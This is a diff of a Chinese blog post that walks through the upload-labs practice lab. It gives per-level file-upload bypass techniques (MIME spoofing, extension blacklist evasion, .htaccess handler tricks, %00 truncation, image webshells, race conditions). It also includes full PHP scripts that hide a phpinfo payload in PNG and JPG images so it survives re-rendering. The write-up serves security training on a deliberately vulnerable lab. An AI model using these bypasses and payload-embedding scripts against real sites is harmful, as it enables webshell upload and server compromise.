@@ -17,7 +17,7 @@
 <meta property="og:site_name" content="MINX&#39;s Blog">
 <meta property="og:description" content="emmmm">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-01-29T11:10:42.930Z">
+<meta property="og:updated_time" content="2020-05-07T08:29:36.112Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="upload-labs">
 <meta name="twitter:description" content="emmmm">
@@ -27,7 +27,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1584554391871">
+  <link rel="stylesheet" href="/css/style.css?v=1589037610213">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -145,8 +145,8 @@
     </div>
   <div class="nexmoe-post-meta">
     <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月12日</a>
-    <a><i class="nexmoefont icon-areachart"></i>165 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-areachart"></i>1,452 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 7 分钟</a>
     
       <a class="nexmoefont icon-appstore-fill -link" href="/categories/文件上传/">文件上传</a>
     
@@ -155,9 +155,12 @@
   <article>
     <p>emmmm</p>
 <a id="more"></a>
-<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>前端验证，先将一句话写成图片格式，通过前端验证后抓包修改后缀名为php成功上传</p>
-<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>同上也可以上传成功，或者可以上传后缀为php文件，通过修改MIME类型来绕过</p>
-<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>黑名单绕过，可以上传.php4等文件绕过，但是因为是phpstudy搭建，无法解析。。。。</p>
+<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><ol>
+<li>前端验证，先将一句话改成jpg，通过前端验证后抓包修改后缀名为php以及修改content-type：application/octet-stream成功上传</li>
+<li>禁用JS直接上传</li>
+</ol>
+<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>这一关检测的是Content-Type: image/jpeg，抓包修改一下就ok</p>
+<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>黑名单绕过，可以上传.phtml等文件绕过，php解释器可以将phpt、php3、4、5、phtml解析成PHP文件，不能解析的后缀会以txt形式展现，但是其中包含的html代码会被浏览器解析，可以执行JS代码</p>
 <h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>先上传一个test.phpx文件，再上传.htaccess文件使得它能够被解析来绕过.htaccess内容：</p>
 <pre><code>&lt;FilesMatch &quot;test.phpx&quot;&gt;
 
@@ -166,7 +169,221 @@
 &lt;/FilesMatch&gt;</code></pre><p>或者：</p>
 <pre><code>AddType application/x-httpd-php .jpg</code></pre><p>来使得jpg能被解析</p>
 <h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>大小写绕过。。。。</p>
-<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1>
+<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>文件名结尾加空格绕过黑名单</p>
+<h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>文件结尾加“.”可以被解析</p>
+<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>文件结尾加“::$DATA”,Windows特性</p>
+<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>文件结尾加“.空格.”，最后会变成”.php.”Windows特性</p>
+<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>上传phtmlhp绕过</p>
+<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>上传路径修改成../upload/1.php%00,%00截断</p>
+<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>上传路径修改成../upload/1.php+，然后用16进制查看，找到68  70   2b，把2b修改成00然后上传</p>
+<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>要求上传三种格式的图片马，然后用文件包含漏洞执行。jpg格式可以直接用CMD命令<code>copy test.jpg/b test.php/a ma.jpg</code>生成，GIF和PNG格式可以通过Hxd修改正常图片生成，</p>
+<p>其中JPG格式头部<code>FF D8 (FF E0)</code>尾部<code>FF D9</code>PNG格式头部<code>89 50 4E 47 0D 0A 1A 0A</code>GIF格式头部<code>47 49 46 38 39 61</code></p>
+<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>提示用getimagesize()获取图片信息，同样上传图片马即可绕过</p>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>提示本pass使用exif_imagetype()检查是否为图片文件！，绕过方法同上</p>
+<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p>提示进行了二次渲染，印象中是某一个区块二次渲染时不会被改变，GIF格式加在尾部的代码会被删除，我找到了中间空白部分，加上phpinfo后就可以执行。</p>
+<p>PNG还有JPG格式的处理方法比较麻烦，用网上的脚本来生成</p>
+<p>PNG:</p>
+<pre><code class="php">
+&lt;?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+
+
+
+$img = imagecreatetruecolor(32, 32);
+
+for ($y = 0; $y &lt; sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+
+imagepng($img,&#39;./1.png&#39;);
+?&gt;
+​```</code></pre>
+<p>JPG:</p>
+<pre><code class="php">&lt;?php
+    /*
+
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+
+    1) Upload an arbitrary image via secured files upload script
+    2) Save the processed image and launch:
+    jpg_payload.php &lt;jpg_name.jpg&gt;
+
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+
+    Since the most straightforward injection method is used, the following problems can occur:
+    1) After the second processing the injected data may become partially corrupted.
+    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+
+    Sergey Bobrov @Black2Fan.
+
+    See also:
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+
+    */
+
+    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;
+
+
+    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {
+        die(&#39;php-gd is not installed&#39;);
+    }
+
+    if(!isset($argv[1])) {
+        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
+    }
+
+    set_error_handler(&quot;custom_error_handler&quot;);
+
+    for($pad = 0; $pad &lt; 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis-&gt;readShort() != 0xFFD8) {
+            die(&#39;Incorrect SOI marker&#39;);
+        }
+
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
+            $marker = $dis-&gt;readByte();
+            $size = $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis-&gt;seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis-&gt;eof())) {
+                        if($dis-&gt;readByte() === 0xFF) {
+                            if($dis-&gt;readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis-&gt;seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {
+                    die(&#39;Success!&#39;);
+                } else {
+                    break;
+                }
+            }
+        }
+    }
+    unlink(&#39;payload_&#39;.$argv[1]);
+    die(&#39;Something\&#39;s wrong&#39;);
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this-&gt;binData = &#39;&#39;;
+            $this-&gt;order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
+                $this-&gt;binData = file_get_contents($filename);
+            } else {
+                $this-&gt;binData = $filename;
+            }
+            $this-&gt;size = strlen($this-&gt;binData);
+        }
+
+        public function seek() {
+            return ($this-&gt;size - strlen($this-&gt;binData));
+        }
+
+        public function skip($skip) {
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
+        }
+
+        public function readByte() {
+            if($this-&gt;eof()) {
+                die(&#39;End Of File&#39;);
+            }
+            $byte = substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData = substr($this-&gt;binData, 1);
+            return ord($byte);
+        }
+
+        public function readShort() {
+            if(strlen($this-&gt;binData) &lt; 2) {
+                die(&#39;End Of File&#39;);
+            }
+            $short = substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+            if($this-&gt;order) {
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+            }
+            return $short;
+        }
+
+        public function eof() {
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+        }
+    }
+?&gt;</code></pre>
+<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>这一关考察条件竞争，看源码发现是先保存然后再判断是否需要删除，也就是可以一边不断发包上传，一边不断请求执行。上传一个执行就会额外生成木马的木马，抓住判断是否需要删除的一小段时间来发起请求，达到目的。我跑了一万次才有一次访问成功，还是要靠运气。。。。</p>
+<h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>同样也是条件竞争</p>
+<h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>WP说是可以%00截断1.php%00.jpg或者保存名为1.php/.    但是我发现好像可以大小写绕过？试了一下成功了嘻嘻嘻</p>
+<h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>审计代码，1.检查MIME类型 2. 检查文件名，如果是字符串，就直接通过.打散然后取出后缀，因此可以通过上传数组绕过处理，然后上传一个数量为三的数组，最后一个元素放jpg，第一个元素是1.php，中间的元素为空，这样绕过判断最后一个元素是不是jpg，同时拼接出来的文件名是<code>1.php.</code>，达到效果。</p>
+
   </article>
   
     
@@ -218,7 +435,7 @@
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1584554391843"></script>
+<script src="/js/app.js?v=1589037609916"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 <br>
 <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
